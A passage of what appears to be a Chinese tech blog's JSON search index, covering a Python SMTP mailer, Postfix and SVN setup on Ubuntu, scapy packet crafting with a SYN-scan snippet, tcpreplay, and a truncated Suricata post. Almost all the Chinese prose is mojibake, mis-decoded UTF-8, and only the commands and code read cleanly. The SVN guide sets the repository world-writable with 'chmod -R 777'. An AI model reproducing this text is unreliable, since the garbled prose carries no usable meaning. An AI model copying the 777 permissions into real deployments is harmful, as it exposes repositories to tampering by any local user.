&#x27;utf-8&#x27;) message[&#x27;From&#x27;] = self.sender message[&#x27;To&#x27;] = receiver message[&#x27;Subject&#x27;] = Header(subject, &#x27;utf-8&#x27;) try: smtpObj = smtplib.SMTP(self.mail_host, 25) # ç”ŸæˆsmtpObjå¯¹è±¡ï¼Œä½¿ç”¨éSSLåè®®ç«¯å£å·25 smtpObj.login(self.mail_username, self.mail_auth_password) # ç™»å½•é‚®ç®± smtpObj.sendmail(self.sender, receiver, message.as_string()) # å‘é€ç»™ä¸€äºº print(&quot;é‚®ä»¶å‘é€æˆåŠŸ&quot;) except smtplib.SMTPException: print(&quot;Error: æ— æ³•å‘é€é‚®ä»¶&quot;) def sendcontextmail(self, username, passwd, usergroup): &quot;&quot;&quot;å¯ä»¥è‡ªè¡Œå®šåˆ¶é‚®ä»¶å‘é€çš„å†…å®¹&quot;&quot;&quot; self.receiver = &quot;xxxx@xx.com&quot; # æ”¶ä»¶äººé‚®ç®± usergroup = usergroup.lower() context = &quot;ä½ çš„ svn è´¦å·ä¿¡æ¯å¦‚ä¸‹ï¼š&lt;/br&gt;&quot; context += &quot;ç”¨æˆ·åï¼š%s &lt;/br&gt;&quot; % username context += &quot;å¯†ç ï¼š%s &lt;/br&gt;&quot; % passwd context += &quot;å±ç»„ï¼š%s &lt;/br&gt;&quot; % str(usergroup) self.send_mail(self.receiver, &quot;é‚®ä»¶ä¸»é¢˜&quot;, context) # é‚®ç®±å‘é€æ—¶çš„objectä¸»é¢˜if __name__ == &quot;__main__&quot;: # while True: SMTP().init() ç»“æœ","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"},{"name":"python","slug":"python","permalink":"https://gryffinbit.top/tags/python/"}],"author":"Gryffinbit"},{"title":"ubuntuæ­å»ºsmtpé‚®ä»¶æœåŠ¡å™¨","slug":"ubuntuæœåŠ¡å™¨ä¸­æ­å»ºsmtpé‚®ä»¶æœåŠ¡å™¨","date":"2022-08-15T14:37:17.000Z","updated":"2024-11-12T06:59:10.000Z","comments":true,"path":"2022/08/15/ubuntuæœåŠ¡å™¨ä¸­æ­å»ºsmtpé‚®ä»¶æœåŠ¡å™¨/","permalink":"https://gryffinbit.top/2022/08/15/ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%90%AD%E5%BB%BAsmtp%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"å‰è¨€ubuntuç³»ç»Ÿé…ç½®ç›¸å…³Blog: æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½® ç¯å¢ƒé…ç½®Ubuntu: Ubuntu 20.04.2 ARM64 ã€parallelè™šæ‹Ÿæœºã€‘ macOS: macOS Monterey. M1, 2020, ARM64ã€ç‰©ç†æœºã€‘ ubuntuæ“ä½œç”¨æˆ·ï¼šåœ¨rootç”¨æˆ·ä¸‹è¿›è¡Œéƒ¨ç½² å®‰è£…1sudo apt-get install mailutils -y é»˜è®¤é€‰æ‹©ç¬¬äºŒç§ï¼šInternet Siteï¼Œè¡¨ç¤ºç›´æ¥ä½¿ç”¨æœ¬åœ°SMTPæœåŠ¡å™¨å‘é€å’Œæ¥æ”¶é‚®ä»¶ï¼› åœ¨ç¬¬äºŒä¸ªé¡µé¢System mail nameä¸­å¡«å…¥ä½ çš„åŸŸåï¼Œä¹Ÿå°±æ˜¯é‚®ç®±åœ°å€@ç¬¦å·åé¢çš„åŸŸåï¼Œæ¯”å¦‚ï¼Œæˆ‘æƒ³è®¾å®šçš„é‚®ç®±åœ°å€æ˜¯root@gryffinbit.top. é‚£æˆ‘å°±å¡«å…¥ gryffinbit.top å½“å‘ä»¶äººçš„åŸŸååœ°å€æ²¡æœ‰æŒ‡å®šæ—¶ï¼ŒPostfixä¼šè‡ªåŠ¨å°†è¿™ä¸ªåŸŸåæ·»åŠ åˆ°å‘ä»¶äººçš„åœ°å€ä¸­ã€‚ Postfixåœ¨å®‰è£…è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆ&#x2F;etc&#x2F;postfix&#x2F;main.cfé…ç½®æ–‡ä»¶ã€‚å®‰è£…å®ŒæˆåPostfixä¼šè‡ªåŠ¨è¿è¡Œã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹Postfixçš„ç‰ˆæœ¬ã€‚ 1sudo postconf mail_version ä½¿ç”¨netstatæ¥æŸ¥çœ‹Postfixçš„ç›‘å¬æƒ…å†µï¼š 1sudo netstat -anptl Postfixçš„masterè¿›ç¨‹ç›‘å¬TCP 25å·ç«¯å£ï¼Œåœ¨å‘é€æµ‹è¯•é‚®ä»¶ä¹‹å‰ï¼Œæˆ‘ä»¬æœ€å¥½æ˜¯æŸ¥çœ‹25å·ç«¯å£æ˜¯å¦è¢«é˜²ç«å¢™æˆ–ä¸»æœºå•†å±è”½. å°¤å…¶æ˜¯äº‘æœåŠ¡å™¨ï¼Œè¦æ‰‹åŠ¨è®¾ç½®ï¼Œæ‰“å¼€ç«¯å£ã€‚ å‘é€é‚®ä»¶1echo &quot;test email&quot; | sendmail your-eamil æˆåŠŸæ”¶åˆ°é‚®ä»¶ å¯èƒ½å‡ºç°çš„é—®é¢˜é˜¿é‡Œäº‘ç¦ç”¨SMTPæœåŠ¡ã€‚https://help.aliyun.com/knowledge_detail&#x2F;40680.html?spm&#x3D;5176.2000002.0.0.8a2f4dd7AtOIaJï¼Œåœ¨æ­¤æ¡æ–‡ä¸­è®°è½½ï¼š 3.1.3.5. ä¸å¾—å°†é˜¿é‡Œäº‘æ‰€æä¾›çš„äº‘æœåŠ¡å™¨ç”¨ä½œè™šæ‹ŸæœåŠ¡å™¨ã€æˆ–ç”¨ä½œç£ç›˜ç©ºé—´å‡ºç§Ÿï¼Œæˆ–ç”¨ä½œéæ³•ä»£ç†æœåŠ¡å™¨ï¼ˆProxyï¼‰æˆ–é‚®ä»¶æœåŠ¡å™¨ï¼ˆæ ¹æ®é˜¿é‡Œäº‘ã€Šäº‘å¹³å°å®‰å…¨è§„åˆ™ã€‹ï¼Œæœªç»æŠ¥å¤‡è®¸å¯äº‘æœåŠ¡å™¨ä¸å¾—ç”¨äºè¿æ¥SMTPæœåŠ¡å‘é€é‚®ä»¶ï¼Œé˜¿é‡Œäº‘é»˜è®¤å°†ç¦æ­¢äº‘æœåŠ¡å™¨ç”¨äºSMTPæœåŠ¡ï¼‰ï¼› å‚è€ƒèµ„æ–™https://www.jianshu.com/p/f438aa21069e","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"},{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"}],"author":"Gryffinbit"},{"title":"ubuntuæ­å»ºsvnæœåŠ¡å™¨","slug":"ubuntuæœåŠ¡å™¨ä¸­æ­å»ºsvn","date":"2022-08-15T09:54:07.000Z","updated":"2024-11-12T06:59:09.000Z","comments":true,"path":"2022/08/15/ubuntuæœåŠ¡å™¨ä¸­æ­å»ºsvn/","permalink":"https://gryffinbit.top/2022/08/15/ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%90%AD%E5%BB%BAsvn/","excerpt":"","text":"å‰è¨€ubuntuç³»ç»Ÿé…ç½®ç›¸å…³Blog: æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½® ç¯å¢ƒé…ç½®Ubuntu: Ubuntu 20.04.2 ARM64 ã€parallelè™šæ‹Ÿæœºã€‘ macOS: macOS Monterey. M1, 2020, ARM64ã€ç‰©ç†æœºã€‘ ubuntuæ“ä½œç”¨æˆ·ï¼šåœ¨rootç”¨æˆ·ä¸‹è¿›è¡Œéƒ¨ç½² å®‰è£…1234567891011sudo apt-get install subversion -y# åœ¨homeä¸‹åˆ›å»º svnæ–‡ä»¶å¤¹mkdir /home/svn# åœ¨svnæ–‡ä»¶å¤¹ä¸­åˆ›å»ºprojectæ–‡ä»¶å¤¹mkdir /home/svn/project# å°†svnæ–‡ä»¶å¤¹æƒé™è®¾ç½®ä¸º 777chmod -R 777 /home/svn è§£å†³ä¸€ä¸ªwarning 1234567locale -asudo dpkg-reconfigure localessudo vim /etc/locale.gen# æ·»åŠ ä¸€è¡Œen_US.UTF-8 UTF-8sudo locale-genexport LC_ALL=C warningæ¶ˆå¤± 12345# åˆ›å»ºsvnä»“åº“svnadmin create /home/svn/project# å°†dbæ–‡ä»¶å¤¹æƒè®¾ç½®ä¸º 777chmod -R 777 /home/svn/project/db é…ç½®svnç›¸å…³ 1cd /home/svn/project/conf ï¼ˆå…¶ä¸­svnserve.confæ˜¯æœåŠ¡å™¨é…ç½®ï¼Œauthzæ˜¯ç”¨æˆ·çš„è¯»å†™æƒé™è®¾ç½®ï¼Œpasswdæ˜¯è®¾ç½®ç”¨æˆ·å’Œå¯†ç ï¼‰ ä¿®æ”¹svnæœåŠ¡å™¨é…ç½® 12cd /home/svn/project/confvim svnserve.conf æ‰“å¼€æ³¨é‡Šï¼Œæ³¨æ„å¼€å¤´ä¸è¦æœ‰ç©ºæ ¼ ç›¸å¯¹è·¯å¾„ ä¿®æ”¹passwdé…ç½® 12cd /home/svn/project/confvim passwd è®¾ç½®svnç”¨æˆ·åå¯†ç  æ ¼å¼æŒ‰ç…§å¦‚ä¸Šå›¾æ‰€ç¤º ä¿®æ”¹authz 12cd /home/svn/project/confvim authz æ·»åŠ ç®¡ç†å‘˜ã€ä»¥åŠæƒé™ å¯åŠ¨å…ˆåœæ­¢è¿›ç¨‹ 1killall svnserve å¯åŠ¨svn 1svnserve -d -r /home/svn/ æŸ¥çœ‹svnè¿›ç¨‹ 1ps -ef|grep svnserve æ³¨æ„svnçš„ç«¯å£å·ä¸ä¼šé»˜è®¤å¼€å¯ï¼Œè…¾è®¯äº‘æœåŠ¡å™¨ä¸Šè£…svnæ—¶ï¼Œæ‰€ä»¥è¦æ‰‹åŠ¨å¼€å¯3690ç«¯å£ã€‚ æŸ¥çœ‹å·²ç»å¼€å¯çš„ç«¯å£ 1sudo ufw status æ‰“å¼€ç«¯å£ 1sudo ufw allow 3690 å¼€å¯é˜²ç«å¢™ 1sudo ufw enable é‡å¯é˜²ç«å¢™ 1sudo ufw reload å†æ¬¡æŸ¥çœ‹ä¸€ä¸‹ç«¯å£æ˜¯å¦å·²å¼€æ”¾ 1sudo ufw status å®¢æˆ·ç«¯mac 1brew install svn 1svn checkout svn://[svnæœåŠ¡å™¨ip] --username=admin å‚è€ƒæ–‡ç« https://segmentfault.com/a/1190000022713946","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"},{"name":"svn","slug":"svn","permalink":"https://gryffinbit.top/tags/svn/"}],"author":"Gryffinbit"},{"title":"scapyä½¿ç”¨","slug":"scapyä½¿ç”¨","date":"2022-08-12T14:35:33.000Z","updated":"2024-11-12T06:59:22.000Z","comments":true,"path":"2022/08/12/scapyä½¿ç”¨/","permalink":"https://gryffinbit.top/2022/08/12/scapy%E4%BD%BF%E7%94%A8/","excerpt":"","text":"scapy ä»‹ç»scapyæ˜¯ä¸€ä¸ªå¯ä»¥è®©ç”¨æˆ·å‘é€ã€ä¾¦å¬å’Œè§£æå¹¶ä¼ªè£…ç½‘ç»œæŠ¥æ–‡çš„pythonç¨‹åºã€‚è¿™äº›åŠŸèƒ½å¯ä»¥ç”¨äºåˆ¶ä½œä¾¦æµ‹ã€æ‰«æå’Œæ”»å‡»ç½‘ç»œçš„å·¥å…·ã€‚ scapyæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ“çºµæŠ¥æ–‡çš„äº¤äº’ç¨‹åºã€‚å¯ä»¥ä¼ªé€ æˆ–è€…è§£æå¤šç§åè®®çš„æŠ¥æ–‡ï¼Œè¿˜å…·æœ‰å‘é€ã€æ•è·ã€åŒ¹é…è¯·æ±‚å’Œå“åº”è¿™äº›æŠ¥æ–‡ä»¥åŠæ›´å¤šçš„åŠŸèƒ½ã€‚ centos å®‰è£…scapy1234dnf install python3yum install python3-develpip install scapypip install matplotlib pyx cryptography -i https://pypi.tuna.tsinghua.edu.cn/simple è¿è¡Œ 1scapy ç”Ÿæˆæ•°æ®åŒ…12345678910# ä½¿ç”¨Ether()æ–¹æ³•ç”Ÿæˆä¸€ä¸ªä»¥å¤ªç½‘å±‚æ•°æ®åŒ…eth_packet = Ether()# ä½¿ç”¨IP()æ–¹æ³•ç”Ÿæˆä¸€ä¸ªç½‘ç»œå±‚æ•°æ®åŒ…ip_packet = IP()# ä½¿ç”¨TCP()æ–¹æ³•ç”Ÿæˆä¸€ä¸ªtcpæ•°æ®åŒ…tcp_packet = TCP()# ä½¿ç”¨UDP()æ–¹æ³•ç”Ÿæˆä¸€ä¸ªudpæ•°æ®åŒ…udp_packet = UDP()# ä½¿ç”¨ICMP()æ–¹æ³•ç”Ÿæˆä¸€ä¸ªudpæ•°æ®åŒ…icmp_packet = ICMP() æŸ¥çœ‹æ•°æ®åŒ…å†…å®¹1234567891011121314# ä½¿ç”¨IP()æ–¹æ³•ç”Ÿæˆä¸€ä¸ªtcpæ•°æ®åŒ…ip_packet = IP()# æ–¹æ³•ä¸€ã€ä½¿ç”¨raw()æ–¹æ³•æŸ¥çœ‹raw(ip_packet)# æ–¹æ³•äºŒã€ä½¿ç”¨hexdump()æŸ¥çœ‹ã€‚ç±»ä¼¼Wiresharkhexdump(ip_packet)# æ–¹æ³•ä¸‰ã€raw()é…åˆåè®®ç±»æŸ¥çœ‹ã€‚æœ€ä½³# æŸ¥çœ‹è¯¥æ•°æ®åŒ…ä»¥å¤ªç½‘å±‚å†…å®¹ï¼ˆä¸‹å±‚å†…å®¹ä¸å±‚ç¤ºï¼Œä¸Šå±‚å†…å®¹ä¸è§£æåªä»¥loadå½¢å¼å±•ç¤ºï¼‰Ether(raw(ip_packet))# æŸ¥çœ‹è¯¥æ•°æ®åŒ…ç½‘ç»œå±‚å†…å®¹ï¼ˆä¸‹å±‚å†…å®¹ä¸å±‚ç¤ºï¼Œä¸Šå±‚å†…å®¹ä¸è§£æåªä»¥loadå½¢å¼å±•ç¤ºï¼‰IP(raw(ip_packet)) è‡ªå®šä¹‰å­—æ®µå€¼ å®šä¹‰å­—æ®µçš„å€¼æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯åœ¨æ„é€ æ—¶ç›´æ¥ä¼ é€’å‚æ•°ï¼Œå¦ä¸€ç§æ˜¯åœ¨ç”Ÿæˆåé‡æ–°èµ‹å€¼ï¼›è‡³äºå‚æ•°åå³æ˜¯ä¸Šä¸€å°èŠ‚ä¸­æ‰“å‡ºçš„é‚£äº›é¡¹ã€‚ 12345678910111213# æ–¹æ³•ä¸€ï¼Œåœ¨æ„é€ æ—¶ç›´æ¥ä¼ é€’å‚æ•°# ç»™srcä¼ å€¼10.10.6.92ï¼Œttlä¼ å€¼128ï¼›å­—æ®µä¸ºå­—ç¬¦çš„ä»¥å­—ç¬¦ä¸²å½¢å¼ä¼ ï¼Œå­—æ®µä¸ºæ•°å€¼çš„ä»¥æ•°å€¼å½¢å¼ä¼ ip_packet = IP(src=&quot;10.10.6.92&quot;,ttl=128)# æŸ¥çœ‹æ•°æ®åŒ…å„é¡¹å€¼ï¼Œç¡®è®¤srcé¡¹æ˜¯å¦ä¸º10.10.6.92ï¼Œttlé¡¹æ˜¯å¦ä¸º128IP(raw(ip_packet))# æ–¹æ³•äºŒï¼Œåœ¨ç”Ÿæˆåé‡æ–°èµ‹å€¼# ç»™srcèµ‹å€¼10.10.6.92ï¼Œttlèµ‹å€¼128ï¼›å­—æ®µä¸ºå­—ç¬¦çš„ä»¥å­—ç¬¦ä¸²å½¢å¼èµ‹ï¼Œå­—æ®µä¸ºæ•°å€¼çš„ä»¥æ•°å€¼å½¢å¼èµ‹ip_packet.src = &quot;10.10.6.93&quot;ip_packet.ttl = 200# æŸ¥çœ‹æ•°æ®åŒ…å„é¡¹å€¼ï¼Œç¡®è®¤srcé¡¹æ˜¯å¦ä¸º10.10.6.93ï¼Œttlé¡¹æ˜¯å¦ä¸º200IP(raw(ip_packet)) åŒæ—¶è‡ªå®šä¹‰å¤šå±‚åè®®çš„å­—æ®µ1234567891011121314# æ„é€ ä¸€ä¸ªIPæ•°æ®åŒ…ï¼Œæºmacè®¾ç½®ä¸º&quot;14:98:77:72:7f:6c&quot;ï¼Œæºipè®¾ç½®ä¸º&quot;10.10.6.92&quot;ip_packet = Ether(src=&quot;14:98:77:72:7f:6c&quot;)/IP(src=&quot;10.10.6.92&quot;)# å½“å‰æ„é€ å‡½ä¸­æœ€ä½å±‚ä¸ºEtherEther(raw(ip_packet))# å®šä¹‰ä¸€ä¸ªTCPæ•°æ®åŒ…ï¼Œæºmacè®¾ç½®ä¸º&quot;00:00:00:00:00:11&quot;ï¼Œæºipè®¾ç½®ä¸º&quot;10.10.6.92&quot;ï¼Œæºç«¯å£è®¾ç½®ä¸º1234tcp_packet = Ether(src=&quot;14:98:77:72:7f:6c&quot;)/IP(src=&quot;10.10.6.92&quot;)/TCP(sport=1234)# å½“å‰æ„é€ å‡½ä¸­æœ€ä½å±‚ä¸ºEtherEther(raw(tcp_packet))# å®šä¹‰ä¸€ä¸ªåº”ç”¨å±‚æ•°æ®åŒ…ï¼Œåº”ç”¨å±‚å†…å®¹ä¸º&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;app_packet = IP()/TCP()/&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;# å½“å‰æ„é€ å‡½ä¸­æœ€ä½å±‚ä¸ºIPIP(raw(app_packet)) å‘é€å’Œæ¥æ”¶æ•°æ®åŒ…åªå‘é€æ•°æ®åŒ…ä¸æ¥æ”¶æ•°æ®åŒ… send()å‡½æ•°å…è®¸è‡ªå®šä¹‰ç½‘ç»œå±‚ï¼Œsendp()å‡½æ•°å…è®¸è‡ªå®šä¹‰ä»¥å¤ªç½‘å±‚ã€‚ 123send(IP(src=&quot;172.10.1.2&quot;,dst=&quot;10.211.55.2&quot;)/ICMP())sendp(Ether()/IP(src=&quot;172.10.1.2&quot;,dst=&quot;10.211.55.2&quot;)/ICMP()) è™šæ‹Ÿæœºç»™ç‰©ç†æœºå‘åŒ…ï¼Œç½‘å£æ˜¯bridge100 è™šæ‹Ÿæœºscapyå‘é€æˆåŠŸï¼ŒæŠ“åŒ…æ•è·è¯¥æ•°æ®åŒ…è¿›è¡Œç¡®è®¤ å‘é€å¹¶æ¥æ”¶å“åº”æ•°æ®åŒ… sr1()å‡½æ•°å…è®¸è‡ªå®šä¹‰ç½‘ç»œå±‚ï¼Œsrp()å‡½æ•°å…è®¸è‡ªå®šå±‚æ•°æ®é“¾è·¯å±‚ 12rec_packet = sr1(IP(dst=&quot;10.211.55.2&quot;)/ICMP()/&quot;hello world&quot;)rec_packet synæ‰«æ æŠŠFlagså­—æ®µæ˜ç¡®æŒ‡å®šä¸ºSYN 12rec_packet = sr1(IP(dst=&quot;192.168.0.89&quot;)/TCP(dport=80,flags=&quot;S&quot;))rec_packet.show() å‚è€ƒæ–‡ç« scapyä¸­æ–‡æ–‡æ¡£ https://www.cnblogs.com/lsdb/p/10496171.html","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"å·¥å…·","slug":"å…¥ä¾µæ£€æµ‹/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"scapy","slug":"scapy","permalink":"https://gryffinbit.top/tags/scapy/"}],"author":"Gryffinbit"},{"title":"tcpreplayè¿›è¡Œæµé‡åŒ…å›æ”¾","slug":"tcpreplayè¿›è¡Œæµé‡åŒ…å›æ”¾","date":"2022-07-29T15:57:02.000Z","updated":"2024-11-12T06:59:11.000Z","comments":true,"path":"2022/07/29/tcpreplayè¿›è¡Œæµé‡åŒ…å›æ”¾/","permalink":"https://gryffinbit.top/2022/07/29/tcpreplay%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E5%8C%85%E5%9B%9E%E6%94%BE/","excerpt":"","text":"æ¦‚è¿°Tcpreplay æ˜¯ä¸€å¥—å…è´¹çš„å¼€æºä½¿ç”¨ç¨‹åºé›†åˆï¼Œç”¨äºç¼–è¾‘å’Œé‡æ”¾ä»¥å‰æ•è·çš„ç½‘ç»œæ•°æ®æµé‡ã€‚æœ€åˆçš„ç›®æ ‡æ˜¯é‡æ”¾æ¶æ„æµé‡åˆ°å…¥ä¾µæ£€æµ‹é˜²å¾¡ç³»ç»Ÿã€‚ç°åœ¨æœ‰æ›´å¤šçš„ç”¨é€”ï¼Œä¾‹å¦‚é‡æ”¾æŠ¥æ–‡åˆ°WebæœåŠ¡å™¨ã€‚ å·¥å…· Tcpreplayæ˜¯å¤šä¸ªå·¥å…·çš„é›†åˆï¼Œå…¶ä¸­çš„tcpreplayç”¨äºæµé‡åŒ…çš„å›æ”¾ tcpreplay æ˜¯ä¸€ç§pcapåŒ…çš„é‡æ”¾å·¥å…·ï¼Œå¯ä»¥å°†tcpdumpå’Œwiresharkç­‰å·¥å…·æ•æ‰åˆ°çš„ç½‘ç»œæµé‡åŒ…è¿›è¡Œé‡æ”¾ã€‚é€šè¿‡é‡æ”¾ç½‘ç»œæµé‡åŒ…ä»è€Œå®ç°å¤ç°é—®é¢˜æƒ…æ™¯ä»¥å®šä½bugã€‚tcperplayå¯ä»¥ä»¥ä»»æ„é€Ÿåº¦å°†pcapæ–‡ä»¶é‡æ’­åˆ°ç½‘ç»œä¸Š tcpreplayçš„å‘åŒ…æœºåˆ¶ æ‰€è°“å›æ”¾æ•°æ®åŒ…çš„æ„æ€å°±æ˜¯ï¼Œå°†è¿™ä¸ªæ•°æ®åŒ…çš„æµå‘å†æ¬¡é‡ç°ï¼Œä¹Ÿå°±æ˜¯è¯´å†æŠŠè¿™ä¸ªæ•°æ®åŒ…çš„æµå‘èµ°ä¸€éã€‚æ‰€ä»¥tcpreplayæ˜¯æ£€æµ‹æ•°æ®åŒ…çš„åŒ…å¤´çš„å†…å®¹é‡Œé¢çš„æºã€ç›®çš„åœ°ç«¯çš„å†…å®¹ï¼Œç›®çš„ç«¯çš„åœ°å€æ˜¯å¤šå°‘å°±å‘å¾€å“ªé‡Œï¼ŒçŸ¥é“è¿™ä¸ªæˆ‘ä»¬å°±æ¸…æ¥šæˆ‘ä»¬åœ¨ä½¿ç”¨tcpreplayé‡æ”¾çš„æ—¶å€™ï¼Œå„ç§æ•°æ®åŒ…éƒ½æµå‘äº†å“ªé‡Œï¼Œè¿™ä¸ªæ—¶å€™åªéœ€è¦æ‹¿wiresharkæ‹¦æˆªï¼Œå°±å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å„ç§æ•°æ®åŒ…ã€‚ tcpreplayåšä¸åˆ°æœåŠ¡ç«¯èƒ½å®æ—¶å“åº”çš„å›æ”¾ ä½¿ç”¨Tcpreplayå›æ”¾Pcapæµé‡ï¼ŒTcpreplayåªèƒ½ä¿è¯å‘å‡ºå»ï¼Œå¦‚æœæƒ³è¦æœåŠ¡ç«¯å“åº”çš„è¯ï¼Œéœ€è¦ä½¿ç”¨tcpliveplay(ä½¿ç”¨tcpreplayå›æ”¾tcpçš„æ—¶å€™ï¼Œä¸èƒ½åŒæ­¥TCPé‡Œé¢Syn&#x2F;Ackçš„ç¼–å·)ã€‚ åœ¨TcpreplayæœåŠ¡ç«¯åªèƒ½æŠ“åˆ°å•æ–¹å‘çš„æµé‡ tcpreplayå›æ”¾åªæ˜¯æŠŠæ•°æ®åŒ…å‘å‡ºå»ï¼Œæ•°æ®åŒ…å»å¾€ä½•å¤„ï¼Œæ ¹æ®çš„æ˜¯ç›®æ ‡åœ°å€ã€‚å¯¹äºå®¢æˆ·ç«¯-&gt;æœåŠ¡ç«¯çš„æµé‡ï¼Œç›®æ ‡ä¸ºæœåŠ¡ç«¯ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹å‘çš„æµé‡ä¼šå‘å¾€æœåŠ¡ç«¯ã€‚è€Œå¯¹äºæœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯çš„æµé‡ï¼Œæ­¤æ—¶ç›®æ ‡ä¸ºå®¢æˆ·ç«¯ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹å‘çš„æµé‡ï¼Œä¸ä¼šå‘å¾€æœåŠ¡ç«¯ï¼Œè€Œæ˜¯åœ¨å®¢æˆ·ç«¯ã€‚ ä¿®æ”¹MACåœ°å€çš„æ³¨æ„äº‹é¡¹ å¯¹äºä¸å±äºåŒä¸€å±€åŸŸç½‘ä¸‹çš„ä¸¤å°ä¸»æœºï¼Œä¿®æ”¹ç›®çš„IPçš„MACåœ°å€çš„æ—¶å€™ï¼ŒMACåœ°å€ä¸æ˜¯ç›®çš„æœºç½‘å¡ç‰©ç†åœ°å€ï¼Œè€Œæ˜¯æºæœºå™¨æ‰€è¿æ¥çš„äº¤æ¢æœºMACåœ°å€ã€‚ å…³äºtcpreplayå‘åŒ…çš„é”™è¯¯ç§¯ç´¯ Warning: Unable to send packet: Error with PF_PACKET send() [8]:Message too long (errno = 90) æ­¤é”™è¯¯å¾€å¾€æ˜¯ç”±äºç½‘å¡é“¾è·¯çš„MTUé€ æˆï¼Œå¯ä»¥é‡æ–°è®¾ç½®æ›´å¤§çš„MTUå³å¯ã€‚ 1ifconfig &lt;ç½‘å¡&gt; mtu 3000 å®‰è£…CentOSï¼šCentOS-Stream-9-latest-aarch64-dvd1 ã€æœåŠ¡å™¨ç«¯ã€‘ Kali: Kali Linux 2021.3 ARM64ã€å®¢æˆ·ç«¯ã€‘ centos æœåŠ¡å™¨ç«¯ 123dnf install epel-release -ydnf install tcpreplay -ydnf install tcpdump Kaliå®¢æˆ·ç«¯ 123sudo apt-get install tcpreplay -ysudo apt-get install tcpdumpsudo apt-get install netcat-openbsd æŸ¥æ‰¾nc whereis nc ç¡®å®š&#x2F;usr&#x2F;bin&#x2F;ncä¸­æ˜¯è½¯é“¾æ¥ï¼ˆä¹Ÿé˜”ä»¥ä¸ï¼‰ls -l /usr/bin/nc åˆ é™¤åŸè½¯é“¾æ¥ï¼Œé‡å»º 12sudo rm /usr/bin/ncsudo ln -s /opt/netcat/bin/nc /usr/bin/nc ä½¿ç”¨â€“helpæŸ¥çœ‹ncå‘½ä»¤æ˜¯å¦å·²ç»æ”¹ä¸ºnetcatäº†ï¼ˆåŒç†ä¹Ÿé˜”ä»¥å°†&#x2F;usr&#x2F;bin&#x2F;netcatä¸­çš„é“¾æ¥æŒ‡å‘ncï¼‰ 1nc --help ä½¿ç”¨ kaliå¯¹centoså‘èµ·pingåŒ…ï¼Œcentosç”¨WiresharkæŠ“å–å¹¶ä¿å­˜ä¸ºtest.pcap åœ¨centosï¼Œé‡æ”¾ 1tcpreplay -i enp0s5 test.pcap å†æ¬¡æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰åˆšåˆšçš„pingåŒ… å‚è€ƒæ–‡ç«  ncæ— æ³•è¿æ¥ Ncat: Connection refused. tcpreplayå›æ”¾æµé‡é‡åˆ°çš„å‘","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"å·¥å…·","slug":"å…¥ä¾µæ£€æµ‹/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"tcpreplay","slug":"tcpreplay","permalink":"https://gryffinbit.top/tags/tcpreplay/"}],"author":"Gryffinbit"},{"title":"centos-stream-9 å®‰è£…é…ç½®suricataã€IPSã€IDSæ¨¡å¼ã€‘","slug":"centos-stream-9-å®‰è£…suricata","date":"2022-07-28T15:13:50.000Z","updated":"2024-11-12T06:59:49.000Z","comments":true,"path":"2022/07/28/centos-stream-9-å®‰è£…suricata/","permalink":"https://gryffinbit.top/2022/07/28/centos-stream-9-%E5%AE%89%E8%A3%85suricata/","excerpt":"","text":"å‰è¨€centos-stream-9çš„é…ç½®è·³è½¬blogï¼šcentos-stream9armåŸºç¡€é…ç½® 